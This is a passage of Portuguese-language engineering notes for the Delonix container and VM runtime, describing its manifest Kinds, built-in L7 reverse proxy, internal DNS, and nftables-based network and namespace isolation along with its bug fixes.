campo, logo não pode divergir). **Açúcar que baixa no `manifest::load`** — um `kind: Workload` é
reescrito num `kind: Container`/`kind: Vm`/`kind: Pod` sintético (herda `metadata`) e segue o apply
por-Kind normal, tal como um filho de `kind: Stack`; o Workload não sobrevive ao load, por isso
`apply`/`stack apply`/`--dry-run`/`ls`/`describe` e o `apply -f` por-Kind vêem o filho SEM wiring
novo. `cmd/workload.rs` (`lower_workload`, puro/testado) + o ramo no `load()`. **Fail-closed**: o
tipo tem de trazer exactamente o seu bloco (os outros dois ausentes, senão erro de mismatch); tipo
desconhecido/em falta → erro claro. **`type: microvm` (ADR-0006, `docs/adr/0006-workload-type-
microvm.md`)** baixa para `kind: Vm` com o **backend forçado a `cloud-hypervisor`** (o VMM de
microVM) — `spec.microvm` é uma `VmSpec`; um bloco que peça outro backend (ex.: `backend: libvirt`)
é contradição e dá erro dirigido (`force_microvm_backend`, injecta/valida o backend no `Value` cru
antes da desserialização). Precisa de CH instalado + imagem que arranque em CH (não o golden k8s,
que é libvirt-only) — fail-closed no boot se faltar. Já não há tipos reservados. Zero motor novo,
zero daemon, zero dependência (tudo em `-bin`). Validado ao vivo (dry-run + apply real de container/
pod; microvm injecta o backend e recusa o conflito; caminhos fail-closed em EN e PT). Ver
`examples/workload.yaml`.

**`delonix workload {ls,describe,stop,rm}` (ADR-0002, Fase 2a, `docs/adr/0002-compute-driver-trait.md`)** —
o lado IMPERATIVO/day-2 da unificação (a criação é declarativa, via `kind: Workload`). Um trait
`ComputeDriver { list, owns, stop, remove, describe }` (`cmd/workload.rs`) com adaptadores `ContainerDriver`/
`VmDriver` que delegam em `cmd::{container,vm}::workload_*` — wrappers finos sobre a lógica de
list/describe/stop/rm JÁ testada dos motores (zero duplicação, zero crate de motor tocado). `workload
ls` mostra containers E VMs numa só tabela (TYPE/NAME/STATUS/INFO); `describe`/`stop`/`rm` fazem
routing por nome EXACTO, **fail-closed**: zero donos → `no such workload`; um container E uma vm com o mesmo nome →
`ambiguous` (aponta para o comando específico, nunca adivinha). `owner()` é puro sobre a lista de
drivers, testado com drivers falsos. O trait foi feito com um consumidor real de propósito (não
scaffolding morto — o anti-padrão "código à espera do 1.º caller" do `revisor`): cada método tem
caller. **`ensure`/create fica de fora** — criar é `kind: Workload`. **Fase 2b (promover o trait
para o `core` ou um crate `delonix-compute`) só quando houver um 2.º consumidor** (cri/mgmt) — não
antes. Output de uma linha, a espelhar o subcomando nativo (container→id, vm→nome).

**Aproximação ao k8s (4 fatias, todas em main).** (1) **`kind: Container` forma de Pod** —
`spec.containers[]` (k8s) com `env:[{name,value}]`/`ports:[{containerPort,hostPort}]`/`resources.
limits`/`securityContext`/`volumeMounts`+`volumes`, normalizado para o `RunOpts` interno
(`container::pod_to_run_opts`); v1 = 1 container (>1 erro), a forma PLANA continua (back-compat),
detetado por `spec.containers` presente. (2) **`kind: Stack`** agrupa recursos num só doc
(`spec.{networks,volumes,storage,secrets,images,vms,containers,ingress,egress,firewallPolicies,
httpRoutes,dependencies}`), **expandido em `manifest::load`** para os docs individuais em ordem de
dependência (herda a namespace) — o Stack não sobrevive ao load, tudo o resto (apply/ls/describe +
apply por-Kind) vê os filhos. (3) **`kind: Ingress` = Ingress L7 k8s** (ver secção do reverse-proxy;
firewall foi para `FirewallPolicy`). (4) **`stack apply --dry-run`** — `manifest::render_with_
defaults` faz round-trip do spec pelo struct tipado (materializa os `#[serde(default)]`) e imprime
o YAML completo sem aplicar (estilo `kubectl --dry-run=client -o yaml`). Cada grupo expõe um
`pub fn spec_with_defaults(doc) -> serde_yaml::Value` (round-trip pelo seu spec tipado, que tem
`Serialize`); cobre **todos os Kinds** — Network/Volume/Storage/Image/Dependency/Vm/HTTPRoute/
Ingress(k8s)/Egress/FirewallPolicy/Container (flat E Pod-shape, via `pod_spec_with_defaults`). Só
**`Secret`** fica no spec cru de propósito (não reformatar `stringData`). `FwDocSpec` ganhou o campo
`direction` (Option, `skip_serializing_if`) para o round-trip o preservar (o `apply` lê-o do
`doc.spec`). `Metadata`/`ManifestDoc` têm `Serialize` (+ `skip_serializing_if` nos campos vazios).

- **`delonix <container|image|vm|volumes|network> apply [-f ficheiro]`** — aplica só os
  documentos do Kind desse grupo (ignora os outros). Sem `-f`, usa `./delonix-manifest.yaml`
  (erro claro se não existir).
- **`delonix stack apply [-f ficheiro]`** — aplica TODOS os Kinds, por esta ordem (dependência
  por nome): Network → Volume → Image → Vm → Container. **Fail-fast, sem transacionalidade**: o
  que já foi aplicado antes de um erro FICA aplicado (sem rollback).
- **Semântica de `apply`: "garante presente", não um reconciliador.** Sem diffing/rollout/
  drift-detection contínua — isso é trabalho de um orchestrator com controllers (deliberadamente
  fora de escopo aqui; o equivalente privado, `delonix-orchestrator`, fica só no `delonix-paas`).
  Idempotência por Kind: `Network`/`Container` verificam existência por nome antes de criar
  (`store.get`/procura no `Store` por `c.name`); `Volume`/`Vm` já são idempotentes na própria API
  do crate (`VolumeStore::create*`, `delonix_vm::create`); `Image` com `spec.pull` é idempotente
  (`resolve_or_pull`), com `spec.build` reconstrói e substitui a tag a cada `apply` (não há cache
  de build). `kind: Container`'s `spec.detach` tem **default `true`** (diferente do CLI `run`,
  onde é `false`) — um `apply` em primeiro plano bloquearia à espera do processo terminar.
- Exemplo completo de manifesto e o mapeamento spec↔CLI: ver o doc-comment de
  `crates/delonix-runtime-bin/src/cmd/manifest.rs` e o plano desta sessão
  (`/home/walter/plans/mellow-cuddling-canyon.md`, mantido para referência histórica).

## Reverse-proxy L7 (`kind: HTTPRoute`)

Reverse-proxy HTTP/HTTPS declarativo **embutido**. Roteia por `Host` + prefixo de path para
containers backend. Módulos: `cmd/httproute.rs` (schema `HttpRouteSpec` + resolução + `apply`) e
`cmd/ingress_proxy.rs` (o proxy `hyper` + o ciclo de vida). Superfície: `delonix net httproute
ls/apply/rm` + `kind: HTTPRoute` no `stack apply`.

**`kind: Ingress` = Ingress L7 estilo k8s (BREAKING v0.7.x).** Desde esta série, `kind: Ingress`
é a forma **networking.k8s.io/v1** (`spec.rules[].host` + `http.paths[].backend.service.{name,port.
number}`, `spec.tls[]`, `defaultBackend`, `ingressClassName`) e **compila para o mesmo proxy L7**
(`httproute::ingress_to_httproute`/`ingress_spec_of` → `HttpRouteSpec`; recolhido em
`parse_and_validate` a par do `HTTPRoute`). Limitações herdadas do HTTPRoute: **um só cert (sem
SNI)** — o 1.º `tls[]` decide selfSigned/secretRef; `pathType: Exact` é aceite mas tratado como
prefixo; portas nomeadas dão erro (usa `port.number`). **Migração**: o firewall L4 que ANTES vivia
em `kind: Ingress` passou para **`kind: FirewallPolicy` com `direction: ingress`** (já era alias);
`firewall::apply` deixou de tratar `Ingress` (só `Egress`/`FirewallPolicy`); `validate_graph` e o
drift-guard movidos em conformidade; `examples/firewall.yaml` migrado, `examples/ingress.yaml` é a
nova forma L7. A CLI `delonix net ingress` (publish/allow/deny) **continua L4** — só o *Kind* do
manifesto mudou de significado.

- **O proxy é `hyper` puro** (server http1 + cliente `hyper-util` legacy), **confinado ao bin** —
  `hyper`/`hyper-util`/`tokio`/`tokio-rustls`/`rustls-pemfile`/`rcgen`/`bytes`/`http-body-util` são
  deps do `delonix-runtime-bin`; **já vinham na árvore** (transitivas via `delonix-cri`/`tonic`),
  logo **zero superfície de supply-chain nova** (excepto `rcgen`/`rustls-pemfile`, minúsculas). Os
  crates de motor continuam dep-limpos.
- **Onde corre:** um processo `delonix ingress-proxy` (subcomando OCULTO) lançado **dentro do netns
  do holder** (`infra::infra_join_argv` + `setsid` detached; o `nsenter` faz EXEC → PID estável e
  signalável do host). Aí alcança os backends por IP interno; as portas de entrada publicam-se no
  host via `slirp add_hostfwd` (o proxy escuta `0.0.0.0` e apanha o `SLIRP_IP` — o holder **não tem
  `input` chain**, logo sem DNAT). Infra persistente como o slirp/holder, só existe quando há um
  HTTPRoute — respeita o "daemonless".
- **Reload a quente (SIGHUP):** as rotas vivem numa tabela trocável (`Arc<RwLock<Arc<Vec<Route>>>>`);
  `httproute apply` num proxy vivo reescreve a config e envia SIGHUP → só as ROTAS recarregam (mesmo
  PID, sem downtime). **Listeners e TLS ficam FIXOS no arranque** (os sockets são ligados e o
  material TLS carregado uma vez), por isso mudá-los **reinicia o proxy** — o `converge_all` fá-lo e
  DI-LO, porque as ligações em curso são cortadas. É o substrato do auto-registo de containers.
  - **Reinicia com `stop_keeping_sources` e nunca com o `stop()`**, e a distinção não é cosmética:
    aquele é um teardown e apaga também o `auto.json`, ou seja derrubaria TODAS as rotas
    auto-registadas por `container run --expose` — serviços sem relação com o documento mexido, que
    só voltariam quando cada container fosse reiniciado.
  - **O `hot_fields` não tinha braço para `HTTPRoute`/`Ingress`**, e a cadeia caía toda atrás: nenhum
    campo quente → qualquer alteração planeava `Replace` → recusado sem `--replace` → e COM ele o
    `destroy_one` erra, porque uma config COLECTIVA não tem teardown por documento → logo o braço
    `converge_all` do `stack.rs` era inalcançável. As `rules` convergiam à mesma, mas pela cadeia
    antiga do `apply` por-Kind — o padrão «convergiam pelo caminho errado e o resultado parecia
    certo» que o `Vm`/`FirewallPolicy`/`ShareVolume` já tinham dado. Há teste a exigir que todo campo
    comparado seja quente.
  - **DERIVA ETERNA, no caso mais comum que existe**: o `resolve_config` aplicava os defaults
    (`:80`, mais `:443` se houvesse `tls`) e o `desired()` lia `spec.entrypoints` em CRU — um
    manifesto sem `entrypoints` dava `desired=""` contra `actual="80"`, ou seja diferença em TODOS os
    planos de um ficheiro que ninguém tocou. Uma regra, um dono: `effective_entrypoints`.
- **TLS termina no proxy** (`tokio-rustls`, provider `ring`): `spec.tls.mode: selfSigned` (gera um
  cert multi-SAN com `rcgen` cobrindo todos os hosts) ou `secretRef` (lê `tls_crt`/`tls_key` — ou
  `tls.crt`/`tls.key` — de um `kind: Secret`). Limitação v1: **um só cert** (sem selecção por SNI).
- **Resolução:** `httproute::apply` corre por ÚLTIMO no `stack apply` (precisa dos containers já
  criados) e resolve cada `backend.service` → `ip:porta` do record. **Só backends com IP na SDN**
  (numa rede custom) servem — os de `--net host/none` não são alcançáveis pelo proxy; erro claro.
- **Ciclo de vida** (`ensure_running`/`stop`): idempotente (vivo → SIGHUP; morto → spawn + publish),
  com **guarda de identidade do PID** (`/proc/<pid>/cmdline` contém `ingress-proxy`, para um PID
  reciclado não levar SIGHUP/SIGTERM), confirmação de arranque (não declara "a servir" se o proxy
  caiu no bind) e publish idempotente. `httproute rm` mata o proxy + despublica.
- **Segurança:** `host`/`path`/`backend.service` passam por `valid_host`/`valid_path_prefix`/
  `valid_service` antes de qualquer uso; headers **hop-by-hop** (Connection/Transfer-Encoding/
  Upgrade/…) removidos nos dois sentidos (anti-smuggling); timeouts anti-slowloris (handshake TLS,
  header-read, backend→504). **WebSocket/upgrade ainda NÃO é tunelado** (follow-up).
- **Provado E2E** (container `httpd` real numa rede custom): `httproute apply` → proxy no holder →
  `curl host:<porta>` com `Host` header → backend; HTTPS com `curl -k` (TLS negociado, self-signed);
  re-apply recarrega por SIGHUP (mesmo PID); `httproute rm` mata e despublica. Ver `examples/httproute.yaml`.

**Auto-registo de containers (`container run --expose <porta>`) — FEITO.** Um container com
`--expose` é auto-registado no proxy L7 sob o FQDN interno `<nome>.<namespace>.delonix.internal`,
com reload a quente (SIGHUP), removido no `container rm`. A config final compõe-se de DUAS fontes
que **nunca se apagam**: **MANUAL** (`kind: HTTPRoute` → `set_manual`/`manual.json`) + **AUTO**
(`--expose` → `auto_register`/`auto.json`, read-modify-write sob **flock** contra lost-update).
`rebuild()` une as duas → `ensure_running` (ou `stop` se ficou tudo vazio). `httproute rm` limpa só
a parte MANUAL (as auto sobrevivem). As auto-rotas servem-se em **:8080** (não :80 — em rootless o
slirp não publica portas <1024). O `--expose` exige `--net <rede>` (avisa senão) e re-regista no
`start`. Provado E2E: `--expose` → `curl host:8080 -H 'Host: <fqdn>'` → container; múltiplas
auto-rotas + MANUAL coexistem no mesmo proxy. **Limitação**: adicionar uma auto-rota com o proxy JÁ
noutro listener não liga a porta nova (SIGHUP recarrega só rotas — herdado dos listeners-fixos).
Faz do Delonix um substituto do k8s (DNS+ingress) em ambientes pequenos.

## DNS interno / descoberta de serviço (`<nome>.<namespace>.delonix.internal`)

O DNS do holder (`infra::dns_server_main`/`dns_resolve`) resolve nomes de container/VM para o IP
da SDN — descoberta de serviço estilo k8s (CoreDNS), sem nada a configurar. Esquemas:

- **`<nome>`** (simples) e **`<nome>.delonix.io`** (legado) → resolvem o container por nome, em
  QUALQUER namespace (comportamento de sempre, preservado).
- **`<nome>.<namespace>.delonix.internal`** → resolve E **verifica a namespace** (isolamento também
  no DNS: resolver com a namespace errada dá **NXDOMAIN**). `parse_internal_name` (pura, testada)
  separa nome/namespace.
- **Anti-sequestro**: a divisão por namespace só se aplica ao sufixo `.delonix.internal` — um
  domínio EXTERNO (`api.github.com`) **nunca** é sequestrado por um container `api` na ns `github.com`;
  fica como nome-inteiro (não casa) e reencaminha.
- **Provado E2E**: `api.prod.delonix.internal` → IP correcto; `api` simples resolve; namespace
  errada → NXDOMAIN. É a fundação do **auto-registo** (cada container HTTP ganha FQDN + rota no
  proxy — próxima fatia).

## Alcançabilidade dirigida (`kind: Dependency` / `KnowDepends`)

`kind: Dependency` (alias `KnowDepends`) — comunicação **DIRIGIDA** entre containers, ao contrário
da `Network` (bidirecional). `spec: { from, to (escalar ou lista), ports?, proto? }`: `from`
alcança `to`, mas `to` não fica exposta aos outros containers da rede. Caso clássico: a app conhece
a DB, a DB não fica acessível aos outros apps de uma rede partilhada (`cmd/dependency.rs`).

- **Açúcar sobre o firewall L4 por-container** (zero dataplane novo): compila para, no `to`, ingress
  **default-deny** (protege) + um `allow` do IP do `from`. Reutiliza `ContainerFw`/`infra::
  apply_firewall` via `firewall::apply_container_ingress` (helper partilhado). Várias `Dependency`
  para o mesmo `to` **acumulam** os `allow`. O retorno da conversa flui porque a SDN é stateful.
- **Alias de Kind** `KnowDepends`→`Dependency` (`canonical_kind`). Grafo valida `from`/`to` como
  containers; `stack apply` corre-o após o firewall (precisa dos IPs). Ver `examples/dependency.yaml`.
- **Provado E2E**: rede aberta (app E other alcançam db) → após `Dependency app→db`, app OK e other
  BLOQUEADO (timeout).
- **Semântica v1 e limites**: garante "`to` protegido, só os `from` declarados o alcançam". O
  bloqueio do **sentido inverso** (`to` não INICIA para `from`) completa-se com **Namespaces**
  (isolamento default-deny universal — próxima fatia). Um `to` que seja simultaneamente alvo de um
  `kind: Ingress` explícito **e** de `Dependency` avisa (o Dependency é autoritativo e substitui a
  direção de entrada). Remover a `Dependency` **não** desprotege o `to` ("garante presente").

## Caminho entre REDES (`kind: NetworkRoute` / `network route`, ADR-0013 tier B)

O grão acima do `Dependency`: aquele liga dois **workloads**, este liga duas **redes**. Redes são
isoladas umas das outras por omissão; um `NetworkRoute` declara que uma pode alcançar a outra.
Dirigido, com a mesma assimetria — `from` inicia, o retorno flui (established), `to` não inicia de
volta. Superfície: `delonix network route <from> <to>` (`--rm` fecha) + `kind: NetworkRoute` com
**só dois campos**, `from`/`to`. Módulo `cmd/netroute.rs`, dataplane em `infra::network_route`.

**A regra que o faz compor-se com o isolamento em vez de o minar, e é a única coisa a reter daqui:
uma rota diz que o pacote PODE atravessar; nunca diz que é PERMITIDO.** As chains `fwcont` por
workload continuam a decidir, e uma fronteira de namespace atravessada por uma rota continua a
precisar da sua `Dependency` ou política. São duas perguntas em série, em duas chains diferentes,
e é por isso que são dois Kinds e não um campo de um só:

```
fwdeny (-10)  ← NetworkRoute:   as duas redes têm caminho?    senão: drop
fwcont  (-5)  ← FirewallPolicy: este workload aceita isto?    senão: drop
```

Quem os funde perde a capacidade de exprimir «há caminho mas está fechado», que é o estado normal
de uma rede segmentada — a mesma separação que a AWS faz entre route table e security group.

- **Isolamento entre redes não é a AUSÊNCIA de rota — é um drop par-a-par explícito**, e foi o
  spike do ADR que o mediu (dentro do holder o `ip_forward` já é 1, as rotas das duas bridges já lá
  estão, e as quatro chains do `forward` são `policy accept`). Por isso ABRIR um caminho é uma
  **isenção**, não um dataplane: um elemento no verdict map `@netpair`. Custo constante — a malha
  antiga eram 73 regras para 8 bridges, todas percorridas por pacote; hoje são duas regras
  independentemente de quantas redes existam (o mesmo movimento que o `@fwmap` já fizera).
- **A isenção é consultada nas DUAS chains** (`fwdeny` -10 e `forward` 0), e esquecê-lo já partiu
  o tráfego DENTRO da própria rede: um `accept` **não é terminal entre base chains**, logo isentar
  só no `fwdeny` deixava o pacote seguir para a `forward`, que tem `policy drop` — 100% de perda,
  medido. Há teste a exigir as duas ocorrências (`a_isencao_e_consultada_nas_duas_chains_...`).
- **Documento próprio e não um campo `routes:` no `kind: Network`**: uma rota é uma RELAÇÃO e não
  pertence a nenhuma das pontas. Exprimível dos dois lados é como dois documentos passam a
  discordar sobre a mesma rota — o bug que o `FirewallPolicy` já paga ao RECUSAR duas políticas
  para o mesmo (alvo, direcção).
- **O `via:` do rascunho do ADR não existe.** O spike tornou-o desnecessário e o que sobrou foram
  `from`/`to`; quem copiar o YAML do ADR escreve um campo que o motor não conhece.
- **Já tem estado próprio, e é isso que o torna reversível.** Esta entrada dizia «não tem estado
  próprio a ler» e que o `presence_of` o classificava como `declarative` (`-`) — deixou de ser
  verdade: ganhou um registo (`infra::RouteDef`, em `<root>/ingress/routes/<from>--<to>.json`), o
  `presence` responde `yes`/`no` com o estado vivo ao lado, e saiu da lista `DECLARATIVOS` do
  `wait` (deixá-lo lá daria por pronta uma rota que ainda não existe). **A ausência do braço no
  `presence` foi um bug real** — caía no `_ => ("?", "unsupported kind")`.
- **FECHADO (a entrada anterior descrevia o defeito e pedia esta actualização).** Está agora em
  `CONVERGING_KINDS`, com `desired`/`actual`, posse por `delonix.io/stack` e braço no
  `destroy_one`: tirar a rota do manifesto e correr `apply --prune` **fecha-a**, e o `destroy`
  também. Uma rota criada à mão não leva carimbo e sobrevive aos dois.
  - **O `actual` vem do REGISTO e não do `@netpair`**, e a razão inverteu o desenho óbvio: o mapa
    vive na netns EFÉMERA do holder, que nasce a pedido e morre com o último container — num nó
    ocioso a sonda devolve vazio, o plano lê «a rota desapareceu» e o `--detailed-exitcode` fica em
    2 para sempre, com o gate de deriva em CI vermelho todos os dias. É o problema que o
    `EgressState` já tinha, com a mesma resposta: persistir e repor no `ensure_net_bridge`. O custo
    é dito onde se paga — apagar o elemento à mão continua a ler-se como `NoOp`, e o estado vivo é
    o que o `stack ls` mostra.
  - **A reposição usa `bridge_name` (puro) e não o `resolve_net`**: aquele faz I/O e exigiria a
    outra ponta já recriada, quando um elemento do `@netpair` é só uma string `ifname`. Validado ao
    vivo — a rota voltou com a bridge do outro lado ainda inexistente, que é o caso normal (as
    bridges renascem uma de cada vez, à medida que os workloads se ligam).
  - **A identidade é o PAR, não o `metadata.name`.** Com o nome do documento, renomeá-lo dava
    `Create`+`Delete` para o MESMO elemento nft — e como o `--prune` corre em último, fecharia o
    caminho que o próprio apply acabara de abrir. Daí a recusa de dois documentos para o mesmo par.
  - **`network_remove` esquece as rotas da rede**, e apaga o ELEMENTO além do registo: o
    `bridge_name` é determinístico, logo deixar o par no mapa fazia o caminho REABRIR sozinho na
    próxima rede com o mesmo nome. Foi medido depois de um `destroy` — a primeira versão fechava só
    metade.
  - Cenário de caos `stack_netroute`, que corre o CICLO (cada passo isolado devolve 0 mesmo com o
    defeito). **Lição de método**: a primeira reversão que tentei — `ownable: false` — deixava-o
    VERDE, porque o `stamp` corre para todo Kind convergente e a rota fica com dono na mesma; o que
    o `ownable` governa é a ADOPÇÃO, coberta por teste unitário. A reversão que vale é tirá-lo do
    `CONVERGING_KINDS`, e aí falha com o sintoma exacto («após o prune esperava-se só a rota
    imperativa, há 2»).
- **FECHADO**: as isenções passaram a ter `counter` (a flag na declaração do map dá contadores POR
  ELEMENTO, verificado ao vivo antes de escrever código), e o `stack ls` mostra-o —
  `open, no traffic yet` contra `open (2 packets)`. O contador entra ENTRE a chave e o verdict, que
  é onde um parser escrito para o formato antigo se parte; há teste com o formato REAL capturado e
  com o caso do holder antigo (sem contadores) a ler-se como zero. Nota para quem ler o número: o
  RETORNO não passa pelo par (casa antes no `ct state established`), por isso 3 pings dão 2.
- Exemplo: `examples/netroute.yaml` — declara a rota **e** a `Dependency`, de propósito: tirar uma
  delas e reaplicar é a forma mais rápida de ver que as duas perguntas são mesmo independentes.

## Isolamento de namespace (`metadata.namespace` / `--namespace`)

Namespace lógico de **isolamento** (default `default`), estilo k8s: containers de namespaces
diferentes **não se alcançam** (mesmo na MESMA rede); só um `kind: Dependency` fura a fronteira,
e num só sentido. Superfície: `container run --namespace <ns>` + `metadata.namespace` no manifesto.
Núcleo em `ContainerFw.namespace` + `infra::fw_chain_body`/`ns_set_join`.

- **Modelo unificado por-container** (decisão de desenho — nftables `accept` não é terminal entre
  base chains, o que impede uma chain `nsdeny` separada de compor com o Dependency): o isolamento
  vive na chain dedicada de CADA container (first-match terminal). Um container fora do `default`
  ganha, na entrada: `ip saddr @dlxns_<ns> accept` (mesma namespace) + `ip saddr @dlxall ct state
  new drop` (dropa NOVAS ligações de containers de OUTRA namespace). O `ct new` isenta o retorno
  (established), e o `@dlxall` limita o drop a fontes-container (gateway/DNS/internet passam).
- **Sets nft**: `@dlxall` (todos os IPs de container) + `@dlxns_<hash>` por namespace, mantidos no
  `do_attach` (`ns_set_join`: remove o IP de qualquer `@dlxns` anterior → re-attach/mudança de ns
  corrige-se sem cleanup no detach). O membership é dinâmico — as regras `@set` avaliam a
  composição actual, sem re-aplicar a chain quando um peer entra.
- **Composição com Dependency/Ingress**: uma política EXPLÍCITA é autoritativa e substitui o
  default de namespace (`has_explicit_in` short-circuita as regras de namespace). Assim um
  `Dependency app→db` fura a parede (allow do IP do app na chain do db) e o **sentido inverso**
  db→app fica bloqueado pela regra de namespace do app — a garantia dirigida que o Dependency
  sozinho não dava.
- **Provado E2E** (bateria de isolação, 4 containers, 2 namespaces): same-ns → OPEN; cross-ns →
  BLOQUEADO (timeout); Dependency fura o cross-ns; sentido inverso bloqueado; retorno flui. O
  `container start` **re-aplica** a firewall persistida (o isolamento sobrevive ao reinício).
- **`default` = SDN aberta** (tudo na mesma namespace) → **comportamento inalterado** para quem não
  usa namespaces. Attach de `default` mantém a forma de 5 tokens do control-line (compat com um
  holder antigo num upgrade in-place; só attaches namespaced exigem o holder novo).
- **Pods e VMs também estão dentro (v0.40.0)** — antes ficavam de fora, cada um por sua razão:
  - **Pods estavam META-ligados, o que é pior que desligados.** `create_pod` já passava a
    namespace ao `infra::attach_container`, por isso o IP do pod ENTRAVA em `@dlxall`/`@dlxns_<ns>`
    — as chains dos OUTROS já recusavam ligações vindas dele. O que nunca existiu foi chain
    PRÓPRIA: as regras de isolamento vivem na chain de cada workload, e sem chain nada dropava o
    tráfego a ENTRAR. Fronteira aberta num sentido só, que é o mesmo que aberta. **Medido antes da
    correcção** (3 pods de 1 container na bridge default): `podA(teamA) → podB(teamB)` **REACHABLE**,
    com os sets do holder perfeitamente correctos (`@dlxall={.2,.3,.4}`, teamA=`{.2,.4}`,
    teamB=`{.3}`) e o `@fwmap` **vazio**. Corrigido com `pod::apply_pod_namespace_isolation`,
    chaveada pelo NOME DA NETNS do pod (não pelo id de um membro: a netns é que segura o endereço,
    todos os membros a partilham, e o verdict map é chaveado por IP — uma entrada é tudo o que
    caberia). O teardown já estava coberto (`remove_pod` → `detach_container` → `unfirewall`).
  - **VMs não tinham namespace nenhuma** e havia um obstáculo estrutural: o IP da VM vem por
    **DHCP**, logo no `vm_attach` ainda não se sabe qual é. Resolvido pelo facto de o servidor DHCP
    ser NOSSO e nativo (`dhcp_serve`, em Rust dentro do holder) e o lease ser **determinístico do
    MAC** — `infra::dhcp_lease_ip` calcula-o do lado do host, antes de o guest arrancar. A mesma
    aritmética estava **duplicada em dois sítios** (`dhcp_serve` e `dhcp_ip_for_mac`) e esta sessão
    quase fez uma terceira: agora há UMA função e os três consumidores (servidor, `vm ls`, attach)
    passam por ela. Duas cópias divergiriam no dia em que a pool mudasse, e o sintoma seria o pior
    possível — uma VM com firewall num endereço que ninguém usa, reportada como isolada.
  - **`vm create --namespace` + `metadata.namespace` no `kind: Vm`**; `Vm.namespace` persistido
    (`#[serde(default)]` = `default`, que é exactamente o que os registos antigos eram) e
    reconstruído pelo `config_from`, com teste de regressão dedicado — a namespace desaparecer no
    primeiro `start` seria a 4.ª ocorrência da armadilha já documentada (`-v`, `-p` em rede custom,
    redes extra).
  - **Só o backend `cloud-hypervisor`** — uma VM libvirt vive na `virbr0`, no netns do HOST, um L2
    diferente que este motor não programa. `--namespace` aí é **RECUSADO com erro dirigido**, nunca
    aceite-e-ignorado (a armadilha que este repo já teve de corrigir três vezes:
    `--security-opt seccomp=`, `-v …:z`, `--network-alias`).
  - **Compatibilidade de holder**: a linha de controlo `vmtap` cresce para 6 tokens só quando há
    mesmo namespace a aplicar (`vmtap_line`, pura e testada) — o mesmo idioma que `attach`/
    `attach-extra` já usavam. Contra um holder antigo, uma VM namespaced falha **ALTO**
    (`invalid control command`), nunca arranca sem isolamento em silêncio. Confirmado ao vivo.
  - **Validado ao vivo (2026-08-05)**: pods — cross-ns bloqueado nos DOIS sentidos, same-ns aberto,
    gateway intacto, `@fwmap` com uma chain por pod; VMs — `vm create --backend cloud-hypervisor
    --namespace teamA` real, chain instalada em `10.200.254.20` (o lease previsto, e o mesmo que o
    `vm ls` reporta), e **tráfego real** contra esse endereço através da chain instalada:
    same-ns `1 packet accepted` pela regra `@dlxnse20c4037`, cross-ns + `default`
    `4 packets dropped` pela regra `@dlxall ct state new`. Cenário de caos novo
    (`pod_namespace_isolation`) que **falha com a correcção revertida** e passa com ela.
  - **O que NÃO foi provado com um guest a sério** (nota de 2026-08-05, ULTRAPASSADA em parte: com
    o EDK2 `CLOUDHV.fd` a golden JÁ arranca em CH — ver «A subnet de uma rede passou a valer»):
    à data nenhuma imagem deste host arrancava em Cloud
    Hypervisor (a golden dizia-se libvirt-only por não haver `hypervisor-fw`), por isso o alvo no endereço da
    VM foi um veth real na bridge do holder, não o convidado. O que isso deixa por confirmar é
    apenas o caminho `tap`→guest, que é o mesmo de qualquer VM CH sem namespace nenhuma; a chain,
    o endereço e a decisão do kernel foram exercitados com pacotes verdadeiros.
- **Recuperação a um respawn do holder (v0.41.0)** — a v0.40.0 trouxe os pods para dentro do
  isolamento e isso tornou visível a pergunta seguinte. **Medido antes de qualquer código**: a
  reconciliação imprimia `recovered 1 container(s)` enquanto um pod ao lado ficava `Up 32 seconds`
  com `Network unreachable` — vivo, sem rede, sem chain, e **sem uma linha a dizê-lo**. Uma
  recuperação que reporta sucesso por cima de um workload que abandonou é pior que nenhuma.
  - **Raiz: `Container.pod` nunca era persistido.** O campo existe desde sempre, o `describe`
    sempre o imprimiu, e NADA lho atribuía — o único traço de pertença em disco era uma label.
    **Quarta ocorrência da mesma armadilha** (`-v` não persistido, `-p` em rede custom, redes
    extra perdidas no restart): *estado necessário para RECONSTRUIR o recurso tem de ser
    persistido, não só usado na criação*. Consequências reproduzidas: `describe` de um membro não
    mostrava pod nenhum, e `container restart` de um membro morria com `clone failed: EPERM`
    deixando-o **`Dead` sem caminho de volta**.
  - **`cmd_start` ganhou ramo de pod** (espelho do ramo de rede custom): re-entra na netns
    partilhada; se o holder já não a serve, recria-a COM a namespace do membro, portanto o
    isolamento volta com ela. `reconcile_after_respawn` passou a aceitar membros de pod como
    candidatos (`is_reattach_candidate` ganhou o parâmetro `pod` — um membro tem `network` vazio
    no registo, é o `pod` que prova que tem um fio dentro do holder).
  - **BUG LATENTE apanhado ao ligar isto: `reexec_start` ignorava o próprio parâmetro `netns`** e
    usava o `id`. Funcionava por coincidência — o único chamador passava um netns igual ao id. Um
    membro de pod é o primeiro caso em que diferem. Mesma família dos ajudantes públicos-mortos-com-
    defeito que este repo já apagou duas vezes (`publish_port_allow`, `reap_orphan_hostfwds`). O
    caminho de falha ganhou `owns_netns`: só se desmonta uma netns nossa — a de um pod é
    partilhada, e derrubá-la porque um membro não voltou tiraria a rede aos peers.
  - **BUG QUE SÓ UM POD DE DOIS MEMBROS MOSTRA**: a guarda de idempotência perguntava DENTRO do
    ciclo «o holder serve esta netns?», e a resposta passa a *sim* assim que o PRIMEIRO membro
    recupera — todos os seguintes eram saltados como saudáveis dentro da netns morta
    (`recovered 2 container(s)` com `pa-c0 → Network unreachable`). A pergunta passou a ser feita
    UMA vez, **antes** do ciclo: aí ou o holder servia a netns (nada morreu — saltam-se todos) ou
    não servia (estão todos encalhados — reiniciam-se todos). Para um container, cuja netns é só
    sua, snapshot e consulta ao vivo são equivalentes. **Lição de método**: uma guarda de
    idempotência que consulta estado que o próprio ciclo MUTA não é uma guarda — e um cenário com
    UM elemento nunca o revela; o cenário de caos usa dois de propósito.
  - **Validado ao vivo**: `restart` de um membro com peer vivo (o peer não perde um pacote, o
    membro volta ao mesmo IP do pod); respawn do holder com pod de 2 membros + container em rede
    custom → **os três recuperados**, isolamento reconstruído (cross-ns bloqueado nos dois
    sentidos). Cenário de caos `pod_holder_respawn`, que falha com a correcção revertida.
  - **Continua por fazer**: a recuperação é por REINÍCIO, não por adopção (adoptar a netns viva é
    impossível no kernel em rootless — medido e documentado desde a v0.39); e as **VMs continuam
    fora da reconciliação** (o `tap` morre com o holder e nada o repõe).
- **O holder deixou de ser ponto único de falha (v0.42.0)** — ver a secção «Pin/controlo» abaixo.
  Um reinício do plano de controlo já não mexe em workload nenhum; só a morte do *pin* obriga a
  reconstruir.
- **Limitações v1 (conhecidas)**: (1) `default↔não-default` é **assimétrico** (o `default` é o
